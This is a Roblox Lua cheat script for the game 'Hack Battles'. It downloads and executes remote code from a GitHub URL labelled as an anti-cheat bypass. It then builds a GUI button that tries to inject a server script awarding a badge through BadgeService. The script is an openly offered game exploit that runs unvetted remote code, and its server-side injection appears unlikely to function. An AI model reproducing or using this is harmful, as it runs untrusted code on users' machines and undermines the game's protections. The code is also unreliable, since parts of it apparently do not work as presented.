print("Made by NexuCore Team")
loadstring(game:HttpGet('https://raw.githubusercontent.com/Pro666Pro/BypassAntiCheat/main/main.lua'))()
wait(2)
local plr = game.Players.LocalPlayer
local screenui = Instance.new("ScreenGui")
screenui.Parent = plr.PlayerGui
screenui.Name = math.random(100000, 999999)

local frame = Instance.new("Frame")
frame.Parent = screenui
frame.Size = UDim2.new(0.255, 0,0.563, 0)
frame.Position = UDim2.new(0.726, 0,0.217, 0)
frame.BackgroundColor3 = Color3.new(0,0,0)

local uicorner = Instance.new("UICorner")
uicorner.Parent = frame
uicorner.CornerRadius = UDim.new(0, 25)

local uistroke = Instance.new("UIStroke")
uistroke.Parent = frame
uistroke.Color = Color3.fromRGB(0, 85, 0)
uistroke.Thickness = 5

local textlabel = Instance.new("TextLabel")
textlabel.Parent = frame
textlabel.Font = Enum.Font.Merriweather
textlabel.TextScaled = true
textlabel.Text = "🗿 Hack Battles 🗿"
textlabel.TextColor3 = Color3.fromRGB(0, 85, 0)
textlabel.Size = UDim2.new(0.938, 0,0.105, 0)
textlabel.BackgroundTransparency = 1
textlabel.Position = UDim2.new(0.029, 0,0.041, 0)

local remoteEvent = Instance.new("RemoteEvent")
remoteEvent.Parent = game:GetService("ReplicatedStorage")
remoteEvent.Name = "bobBadge"

local bobButton = Instance.new("TextButton")
bobButton.Parent = frame
bobButton.Size = UDim2.new(0.363, 0,0.131, 0)
bobButton.TextScaled = true
bobButton.Text = "Get bob (Badge)"
bobButton.BackgroundColor3 = Color3.new(0, 0, 0)
bobButton.TextColor3 = Color3.fromRGB(0, 85, 0)
bobButton.Position = UDim2.new(0.06, 0,0.185, 0)

local uicorner2 = Instance.new("UICorner")
uicorner2.Parent = bobButton
uicorner2.CornerRadius = UDim.new(0, 25)

local uistroke2 = Instance.new("UIStroke")
uistroke2.Parent = bobButton
uistroke2.Color = Color3.fromRGB(0, 85, 0)
uistroke2.Thickness = 5
uistroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local script1 = Instance.new("Script")
script1.Parent = game:GetService("ServerScriptService")
script1.Source = [[game.ReplicatedStorage:WaitForChild("bobBadge").OnServerEvent:Connect(function(plr)
	game:GetService("BadgeService"):AwardBadge(plr.UserId, 2125950512)
end)]]

bobButton.MouseButton1Click:Connect(function()
	remoteEvent:FireServer()
end)
